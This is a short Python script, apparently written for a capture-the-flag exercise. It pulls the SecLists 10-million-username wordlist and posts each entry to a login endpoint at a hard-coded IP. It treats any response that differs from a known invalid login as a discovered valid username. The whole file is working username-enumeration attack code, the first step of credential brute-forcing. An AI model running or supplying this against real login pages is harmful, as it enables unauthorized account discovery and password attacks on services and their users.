import requests

# get usernames
usernames = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/xato-net-10-million-usernames.txt").text.splitlines()

un_len = len(usernames)

# get response of invalid login to compare
invalid_username_response = requests.post("http://35.196.135.216/94423d4264/login", data={"username": "invaliduser", "password": "invalidpw"}).text

print("invalid user login response:\n{}\n".format(invalid_username_response))

valid_usernames = []

for idx_un, username in enumerate(usernames):
    try:
        r = requests.post("http://35.196.135.216/94423d4264/login", data={"username": username, "password": "pwd"})
        if r.text != invalid_username_response:
                print("### successful login ###")
                valid_usernames.append(username)
        print("{}/{} usernames\nusername = {}\nPOST {}\nstatus_code = {}\n".format(idx_un+1, un_len+1, username, r.url, r.status_code))
    except Exception as e:
        print(e)

print("{} successful usernames\n{}".format(str(len(valid_usernames)), valid_usernames))
